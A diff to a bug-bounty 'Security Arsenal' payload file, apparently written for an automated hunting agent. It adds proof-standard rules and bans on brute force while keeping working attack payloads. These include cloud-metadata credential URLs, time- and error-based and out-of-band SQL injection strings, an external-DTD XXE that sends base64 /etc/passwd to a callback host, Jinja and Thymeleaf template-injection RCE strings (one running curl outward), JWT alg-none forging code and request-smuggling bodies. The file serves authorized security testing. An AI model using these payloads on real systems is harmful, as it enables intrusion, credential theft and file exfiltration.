@@ -5,7 +5,17 @@ description: Security payloads, bypass tables, wordlists, gf pattern names, alwa
 
 # SECURITY ARSENAL
 
-Payloads, bypass tables, wordlists, and submission rules.
+Payloads, bypass tables, wordlists, and submission rules. Each hunt skill says **when** to send these. This file says **what** to send. A payload that errors, reflects, or hangs once is not a finding.
+
+## Proof standard
+- **Unique marker** per sink (`head -c 12 /dev/urandom | base64`). If it is already in the baseline body, pick another. Reflection of `alert(1)` or the word `javascript` is not evidence.
+- **Body-diff.** Compare true vs false (or A vs B) bodies. Same status and the same body is not a bypass.
+- **Timing.** n≥10 interleaved trials. Means must separate (Welch t > 3 or non-overlapping ranges). One slow response is jitter.
+- **OOB.** One unique hostname per sink. A DNS hit proves a lookup. File bytes or `uid=` in the callback path prove the stronger claim. Do not upgrade a lookup into RCE or metadata theft.
+- **Once.** One proof request, then stop. No dumps, no shells left on disk, no shared-cache poison, no second victim.
+- **Never:** brute force, credential stuffing, password spraying, hashcat/john, OTP or backup-code keyspace walks, billion-laughs, ReDoS, `FLUSHALL`, `DROP`/`DELETE`. A missing rate limit is not permission to guess.
+
+Stop at draft. Never auto-submit. Claim only the row you proved.
 
 ---
 
@@ -78,30 +88,36 @@ location.href = SOURCE
 
 ### Cloud Metadata
 ```bash
-# AWS
+# AWS IMDSv1 — role JSON in the body is the proof. A timeout is not.
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 http://169.254.169.254/latest/user-data/
-http://169.254.169.254/latest/dynamic/instance-identity/document
 
-# GCP
+# AWS IMDSv2 — GET without a token returns 401. That is reachability, not keys.
+# Only if the sink can set the method and a header:
+# PUT /latest/api/token  header X-aws-ec2-metadata-token-ttl-seconds: 21600
+# GET the paths above with header X-aws-ec2-metadata-token: <token from PUT>
+
+# GCP — header Metadata-Flavor: Google is required or the body is a rejection
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-# Header: Metadata-Flavor: Google
 
-# Azure IMDS
+# Azure IMDS — header Metadata: true
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
-# Header: Metadata: true
+
+# Other link-local metadata (quote the body; do not assume AWS fields)
+http://100.100.100.100/latest/meta-data/                          # Alibaba
+http://169.254.169.254/opc/v2/instance/                           # Oracle, header Authorization: Bearer Oracle
+http://169.254.169.254/metadata/v1/                               # DigitalOcean
 ```
 
 ### Internal Service Fingerprinting
 ```bash
-http://localhost:6379      # Redis (unauthenticated, RESP protocol)
-http://localhost:9200      # Elasticsearch (/_cat/indices)
-http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
-http://localhost:8080      # Admin panel
-http://localhost:2375      # Docker API — GET /containers/json
-http://localhost:10.96.0.1:443  # Kubernetes API server
+http://127.0.0.1:6379/     # Redis — one INFO or GET, never FLUSHALL/SLAVEOF
+http://127.0.0.1:9200/     # Elasticsearch /_cat/indices
+http://127.0.0.1:8080/     # admin listener — quote a title or banner
+http://127.0.0.1:2375/containers/json   # Docker API. Read-only. Do not create containers.
+https://kubernetes.default.svc/api      # from inside a pod; 10.96.0.1 is only the default ClusterIP
 ```
 
 ### SSRF IP Bypass Payloads
@@ -137,9 +153,9 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ' OR 1=1--
 ' OR 1=1#
 ' UNION SELECT NULL--
-'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
-'; SELECT SLEEP(5)--          -- MySQL time-based
-' OR SLEEP(5)--
+' AND SLEEP(2)-- -                 -- MySQL. Space after -- . Confirm with n≥10, not one delay
+' AND 1=(SELECT 1 FROM pg_sleep(2))--
+'; WAITFOR DELAY '0:0:2'--         -- MSSQL, only if stacked queries run
 ```
 
 ### Union-Based (determine column count)
@@ -151,16 +167,14 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### Blind SQLi (time-based confirmation)
+Use a 2s delay, interleaved n≥10 against a 0s control. One slow hit is not confirmation. MySQL needs a space after `--` (`-- -`). `pg_sleep` returns void, so it has to sit in `FROM`. No `BENCHMARK` and no giant `RANDOMBLOB`.
 ```sql
-# MySQL
-' AND SLEEP(5)--
-# PostgreSQL
-' AND pg_sleep(5)--
-# MSSQL
-'; WAITFOR DELAY '0:0:5'--
-# Oracle
-' AND 1=dbms_pipe.receive_message('a',5)--
+' AND SLEEP(2)-- -                              -- MySQL
+' AND 1=(SELECT 1 FROM pg_sleep(2))--           -- PostgreSQL
+'; WAITFOR DELAY '0:0:2'--                      -- MSSQL, stacked queries on
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',2)=1--      -- Oracle (timeout returns 1)
 ```
+Error-based, one cell, when the database prints the message: MySQL `extractvalue(1,concat(0x7e,version()))`, PostgreSQL `cast(version() as int)`, MSSQL `convert(int,@@version)`, SQLite `cast(sqlite_version() as int)`. OOB, one hostname: MSSQL `xp_dirtree '\\\\UNIQUE.collab\\a'`, Oracle `utl_http.request`, MySQL `LOAD_FILE` of a UNC path on Windows. Stop at version or one cell.
 
 ### WAF Bypass
 ```sql
@@ -189,16 +203,23 @@ SeLeCt * FrOm uSeRs                -- case variation
 <foo>&xxe;</foo>
 ```
 
-### Blind OOB via DNS + Data Exfil
+### Blind file exfil (external DTD)
+Defining `%data;` and expanding it inside the **internal** subset usually does nothing. Put the wrapper in an external DTD the parser actually fetches.
 ```xml
-<?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY % data SYSTEM "file:///etc/passwd">
-  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
-  %param1;
+  <!ENTITY % dtd SYSTEM "http://UNIQUE.collab/x.dtd">
+  %dtd;
 ]>
-<foo>&exfil;</foo>
+<root/>
 ```
+`x.dtd` (hosted where you can log the request line):
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://UNIQUE.collab/?d=%file;'>">
+%eval;
+%send;
+```
+Newlines and `&` in raw `/etc/passwd` break a URL — the PHP base64 filter avoids that on PHP. A DNS hit with an empty query is a fetch, not a file read. No billion-laughs. XInclude when `DOCTYPE` is stripped: `<xi:include parse="text" href="file:///etc/passwd"/>`.
 
 ### XXE via DOCX/SVG/PDF Upload
 - SVG: `<image href="file:///etc/passwd" />`
@@ -269,9 +290,14 @@ header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decod
 payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
 token = f"{header}.{payload}."
 
-# Secret bruteforce
-hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
+# Do not crack HMAC secrets. No hashcat, no rockyou, no wordlist against the key.
 ```
+
+Algorithm confusion and header injection are single tests, not keyspace searches:
+- `alg` of `none` / `None` / empty signature — accepted only if a later API call returns the victim's data. A decoded payload is not acceptance.
+- RS256→HS256 using the **public** key you already downloaded (JWKS). One forged token. If the API rejects it, stop.
+- `jwk` or `jku` pointing at a host you control — one fetch. The bug is the server trusting that key. Do not brute `kid`.
+- `kid` path traversal or SQL only under `hunt-lfi` / `hunt-sqli` rules, and only when the file or the query result is in the response.
 
 ### OAuth Attacks
 ```bash
@@ -403,8 +429,10 @@ ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ```python
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
 ```
+Do not hardcode `.__subclasses__()[N]` — the index changes every Python build. Walk subclasses only if `lipsum` / `cycler` / `config` are absent, and stop at the first `uid=`. A sandbox exception means SSTI without RCE.
 
 **Twig (PHP/Symfony):**
 ```php
@@ -425,10 +453,9 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 <%= IO.popen('id').read %>
 ```
 
-**Spring Thymeleaf:**
+**Spring view / Thymeleaf** — `exec` prints nothing; confirm with one callback. The `__${...}__::.x` form is view-name injection, not a random HTML field. `${T(...)}` is SpEL when a header or query reaches `parseExpression`.
 ```java
-${T(java.lang.Runtime).getRuntime().exec('id')}
-__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+__${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.collab/"})}__::.x
 ```
 
 **EJS (Node.js):**
@@ -496,13 +523,8 @@ Transfer-Encoding
 # Back-end uses CL → desync
 ```
 
-### Detection (Burp)
-```
-1. Install HTTP Request Smuggler extension
-2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
-3. All four probe types automatically sent
-4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
-```
+### Detection
+A timeout is a lead only if a normal POST and a finished chunked body (`0\r\n\r\n`) are fast, and the probe is slow on ≥3 interleaved tries. CL.TE timing body is `Content-Length: 4` plus bytes `1\r\nA\r\nX` (front-end forwards `1\r\nA`; a TE back-end waits). Confirmation is a **second** request on that connection whose response is for a path you hid in the prefix (`/smug-UNIQ`), not a hang of the POST you failed to finish. Classic CL+TE returns 400 on strict front-ends — try obfuscated TE, duplicate CL, H2.CL/H2.TE, and CL.0 before leaving the host (`hunt-http-smuggling`). Do not poison a shared cache or another user's request.
 
 ### Impact Chain
 ```
@@ -560,21 +582,8 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 
 ## MFA / 2FA BYPASS PAYLOADS
 
-### Pattern 1: OTP Brute Force (no rate limit)
-```bash
-# Try all 6-digit OTPs
-ffuf -u "https://target.com/api/verify-otp" \
-  -X POST \
-  -H "Content-Type: application/json" \
-  -H "Cookie: session=YOUR_SESSION" \
-  -d '{"otp":"FUZZ"}' \
-  -w <(seq -w 000000 999999) \
-  -fc 400,429 \
-  -t 5
-
-# Rate limit bypass: rotate session tokens between requests
-# Or use GraphQL batching to send 100 attempts per request
-```
+### Pattern 1: OTP keyspace — do not do this
+Walking `000000`–`999999`, backup codes, or a GraphQL batch of guesses is brute force. Forbidden even when the endpoint has no rate limit. Missing rate limit alone is not a report. Logic bugs below are the tests.
 
 ### Pattern 2: OTP Reuse (token not invalidated)
 ```
@@ -594,24 +603,8 @@ Step 3: Forward modified response → sometimes app trusts it and proceeds
 Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
 ```
 
-### Pattern 4: Code Predictability
-```python
-import requests, time
-
-# Some implementations use timestamp-based OTPs:
-for t_offset in range(-30, 31):  # Test ±30 seconds
-    totp_value = generate_totp(secret, time.time() + t_offset)
-    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
-    if r.status_code == 200:
-        print(f"VALID at offset {t_offset}s: {totp_value}")
-        break
-```
-
-### Pattern 5: Backup Codes Not Rate Limited
-```bash
-# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
-# Try brute force on /api/verify-backup-code if no rate limit
-```
+### Pattern 4: Code you already have
+If a leak already gave you the seed, submit **one** current code to prove it. You may retry the single previous timestep for clock skew. Do not loop a window, and do not brute backup codes. No seed → skip this pattern.
 
 ### Pattern 6: Skip MFA Step (Workflow Bypass)
 ```bash
@@ -761,6 +754,9 @@ Missing HttpOnly / Secure cookie flags alone
 Broken external links
 Pre-account takeover (usually — requires very specific conditions)
 Autocomplete on password fields
+Brute force / credential stuffing / password spraying / hash cracking (including OTP and JWT secrets)
+DoS: entity bombs, ReDoS, cache-poison loops, crash PoCs, FLUSHALL
+A rate-limit gap with no proven logic bug
 ```
 
 ---
@@ -775,7 +771,7 @@ These are valid ONLY when combined with a chain that proves real impact:
 | Clickjacking | + sensitive action + working PoC (not just login) | Medium |
 | CORS wildcard | + credentialed request exfils user data | High |
 | CSRF | + sensitive action (transfer funds, change email) | High |
-| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
+| Missing rate limit | Not a chain. Do not exhaust OTP, backup codes, or passwords | Do not submit |
 | SSRF DNS-only | + internal service access + data retrieval | Medium |
 | Host header injection | + password reset email uses it | High |
 | Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
@@ -860,7 +856,7 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 
 The classic CL.TE / TE.CL HTTP smuggling payloads no longer work against Nginx ≥ 1.21, Caddy 2.x, Envoy ≥ 1.20 (verified in Phase 2H). They DO still work against HAProxy ≤ 2.4, older F5 BIG-IP, Citrix ADC, AWS ALB-specific configs, and Apache Traffic Server. Fingerprint the front-end first — `curl -sI` → `Server:` header + `Via:` chain + TLS JA3 — before burning hours on payloads that the parser already rejects at the front door.
 
-Same story for XXE classic — Python lxml ≥ 5.x silently drops SYSTEM entities by default (Phase 2G finding). The payloads remain valid against: Java SAX, PHP DOMDocument with LIBXML_NOENT, .NET XmlDocument with XmlResolver still wired, older lxml (< 5.0), Ruby Nokogiri with DTDLOAD, and a long tail of embedded XML processors (SOAP libraries, SAML implementations, Office document parsers). The payload library still ships these — the operator decision is whether the target's parser is in the still-vulnerable set.
+Same story for XXE classic — several parsers ignore SYSTEM entities unless a flag is on (PHP needs `LIBXML_NOENT`; current .NET refuses DTDs; stock `xml.etree` and default Nokogiri do not expand them). Send the inline entity first (`<!ENTITY uniq "XXEUNIQ">`). If `XXEUNIQ` never comes back, try another content-type or XInclude, then leave that endpoint. Java SAX/DOM, PHP with `LIBXML_NOENT`, .NET with `DtdProcessing.Parse`, and Office/SAML parsers still resolve SYSTEM. A DNS hit is a fetch, not a file read.
 
 Other stale-by-default-but-not-everywhere payloads as of 2026: `javascript:` URLs in `<a href>` (Chrome blocks unless explicit user gesture; works in embedded WebViews, Electron, older Edge); `data:text/html` for top-level navigation (modern browsers strip in nav contexts); CRLF injection in `Location:` (most reverse proxies normalize). Always test in the actual target environment, not in a generic browser.
 
